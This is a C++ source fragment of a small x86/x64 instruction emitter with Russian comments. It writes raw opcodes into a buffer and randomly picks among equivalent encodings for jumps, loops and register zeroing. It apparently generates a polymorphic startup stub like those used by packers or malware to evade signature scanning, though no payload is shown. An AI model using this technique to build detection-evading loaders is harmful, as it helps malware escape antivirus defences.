void assembler::call_rel32(DWORD dwRel32, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler] .code:0x%X call rel32 = %i", *dwIndex, (signed int)dwRel32);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;
	lpBuffer[dwOffset++] = 0xE8; // call rel32
	PDWORD pRel32Operand = (PDWORD)&lpBuffer[dwOffset];
	*pRel32Operand = dwRel32;
	dwOffset += sizeof(dwRel32);

	*dwIndex = dwOffset;
}

void assembler::jmp_rel32(DWORD dwRel32, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler] .code:0x%X jmp rel32 = %i", *dwIndex, (signed int)dwRel32);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;
	lpBuffer[dwOffset++] = 0xE9; // jmp rel32
	PDWORD pRel32Operand = (PDWORD)&lpBuffer[dwOffset];
	*pRel32Operand = dwRel32;
	dwOffset += sizeof(dwRel32);

	*dwIndex = dwOffset;
}


void assembler::jmp_register(UINT reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler] .code:0x%X jmp /r %d", *dwIndex, reg_offset);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;
	lpBuffer[dwOffset++] = 0xFF; // jmp reg/imm
	lpBuffer[dwOffset++] = 0xE0 + reg_offset; // /r
	*dwIndex = dwOffset;
}

void assembler::ret(LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler] .code:0x%X ret", *dwIndex);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;
	lpBuffer[dwOffset++] = 0xC3; // ret
	*dwIndex = dwOffset;
}

void assembler::loop_until_reached(UINT reg_offset, UINT checkamount, DWORD dwDeltaLabel, LPBYTE lpBuffer, PSIZE_T dwIndex, DWORD dwArch, long holdrand)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler] .code:0x%X generating loop check cmp r %d, 0x%x / jnz delta 0x%x", *dwIndex, reg_offset, checkamount, dwDeltaLabel);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;

	// cmp r, checkamount
	if (dwArch == IMAGE_FILE_MACHINE_AMD64)
		lpBuffer[dwOffset++] = 0x48;
	lpBuffer[dwOffset++] = 0x81;
	lpBuffer[dwOffset++] = 0xF8 + reg_offset;
	*((PDWORD)&lpBuffer[dwOffset]) = (DWORD)checkamount;
	dwOffset += sizeof(DWORD);

	UINT uChoice = (_rand(&holdrand) % 2) + 1;
	//UINT uChoice = 2;
	
	// теперь у нас есть флаг, в случае ZF = 1 нам нужно перейти по адресу находящемуся на dwDeltaLabel
	// у нас есть несколько способов это сделать:
	// (1):
	// jnz rel32
	// (2):
	// jz next
	// jmp rel32
	
	DWORD dwRel32 = 0;
	DWORD dwInstSize = 0;
	switch (uChoice)
	{
	case 1:
		// rel32 = RVA_адрес - (RVA текущей инструкции + ее размер)
		// вместо RVA можем воспользоваться нашей дельтой от начала стартового кода
		dwInstSize = 6;
		dwRel32 = dwDeltaLabel - (dwOffset + dwInstSize);
		lpBuffer[dwOffset++] = 0x0F;
		lpBuffer[dwOffset++] = 0x85;
		*((PDWORD)&lpBuffer[dwOffset]) = (DWORD)dwRel32;
		dwOffset += sizeof(DWORD);

#ifdef _DEBUG
		wsprintfW(debugOut, L"[assembler] jnz rel32 = %i", dwRel32);
		WriteLog(debugOut);
#endif
		break;
	case 2:

		// опять же два варианта кодирования jz
		uChoice = (_rand(&holdrand) % 2) + 1;
		switch (uChoice)
		{
		case 1:
			dwInstSize = 5;
			lpBuffer[dwOffset++] = 0x74;
			lpBuffer[dwOffset++] = 5; // rel32 пропускающий jmp
			break;
		case 2:
			dwInstSize = 6;
			lpBuffer[dwOffset++] = 0x0F;
			lpBuffer[dwOffset++] = 0x84; // jz rel32
			dwRel32 = 0x5;
			*((PDWORD)&lpBuffer[dwOffset]) = (DWORD)dwRel32;
			dwOffset += sizeof(DWORD);
			break;
		default:
#ifdef _DEBUG
			WriteLog(L"[assembler::loop_until_reached] unknown choice [2]");
#endif
			break;
		}

		// jmp на дельту
		// rel32 = RVA_адрес - (RVA текущей инструкции + ее размер)
		// вместо RVA можем воспользоваться нашей дельтой от начала стартового кода
		dwRel32 = dwDeltaLabel - (dwOffset + 5);
		lpBuffer[dwOffset++] = 0xE9;
		*((PDWORD)&lpBuffer[dwOffset]) = (DWORD)dwRel32;
		dwOffset += sizeof(DWORD);

#ifdef _DEBUG
		wsprintfW(debugOut, L"[assembler] jmp rel32 = %i", dwRel32);
		WriteLog(debugOut);
#endif

		break;
	default:
#ifdef _DEBUG
		WriteLog(L"[assembler::loop_until_reached] unknown choice [1]");
#endif
		break;
	}

	*dwIndex = dwOffset;
}

void assembler::register_tereshkova_setzero(UINT reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex, DWORD dwArch, long holdrand)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler] .code:0x%X setting r %d to zero", *dwIndex, reg_offset);
	WriteLog(debugOut);
#endif
	SIZE_T dwOffset = *dwIndex;

	UINT uMode = _rand(&holdrand) % 2 + 1;

	switch (uMode)
	{
	case 1:

		lpBuffer[dwOffset++] = 0x6A; // push 0
		lpBuffer[dwOffset++] = 0x00;

		switch (dwArch)
		{
		case IMAGE_FILE_MACHINE_I386:
			assembler::x86::pop_r32((assembler::x86::GENERAL_REGISTERS_T)reg_offset, lpBuffer, &dwOffset);
			break;
		case IMAGE_FILE_MACHINE_AMD64:
			assembler::x64::pop_general_r64((assembler::x64::GENERAL_REGISTERS_T)reg_offset, lpBuffer, &dwOffset);
			break;
		}
		break;
	case 2:

		// mov r, 0
		if (dwArch == IMAGE_FILE_MACHINE_AMD64)
			lpBuffer[dwOffset++] = 0x48; // префикс mov'а
		lpBuffer[dwOffset++] = 0xB8 + reg_offset; // mov r,

		*((PDWORD)&lpBuffer[dwOffset]) = 0; // операнд дворд на 32
		dwOffset += sizeof(DWORD);
		if (dwArch == IMAGE_FILE_MACHINE_AMD64) // и qword на 64
		{
			*((PDWORD)&lpBuffer[dwOffset]) = 0;
			dwOffset += sizeof(DWORD);
		}

		break;
	default:
#ifdef _DEBUG
		WriteLog(L"[assembler] set zero reg unknown choice");
#endif
		break;
	}

	*dwIndex = dwOffset;
}

void assembler::add_reg_imm32(UINT reg_offset, DWORD dwValue, LPBYTE lpBuffer, PSIZE_T dwIndex, DWORD dwArch)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler] .code:0x%X add r %d, 0%xh", *dwIndex, reg_offset, dwValue);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;

	if (dwArch == IMAGE_FILE_MACHINE_AMD64)
		lpBuffer[dwOffset++] = 0x48;

	lpBuffer[dwOffset++] = 0x81;
	lpBuffer[dwOffset++] = 0xC0 + reg_offset;
	*((PDWORD)&lpBuffer[dwOffset]) = dwValue;
	dwOffset += sizeof(DWORD);

	*dwIndex = dwOffset;
}
